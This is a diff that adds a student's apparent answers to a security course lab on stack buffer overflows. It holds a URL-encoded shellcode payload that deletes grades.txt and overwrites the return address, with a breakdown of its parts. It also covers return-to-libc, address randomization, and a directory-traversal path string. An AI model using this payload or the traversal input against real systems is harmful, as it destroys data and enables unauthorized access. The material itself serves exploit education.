@@ -1,0 +1,12 @@
+1-it unlinks to delete the file, exit stops the execution of the program
+%EB%1B%5E%89v%0B1%C0%88F%0A%B8%0A%00%00%00%89%F3%CD%80%B8%01%00%00%001%DB%CD%80%E8%E0%FF%FF%FFgrades.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%DC%DC%FF%FF
+2-First part: shellcode for removing grades.txt
+  Second part: Overflows the buffer until we reach the return address
+  Third part: overwrites the return address to be the address of the shellcode we wrote in part 1
+3-No, since we can't execute things in the stack, our code doesn't run.
+4-return address = the location of unlink
+  P = memory location of the filename (grace.txt)
+5-yes, the values change, no the difference does not change. The change would make an exploit harder, since every time the server restarts, I would have to find the new addresses.
+6-Magic path: ../../../../../../../..
+  No, it doesn't work in the browser. It says File not found or not accessible
+
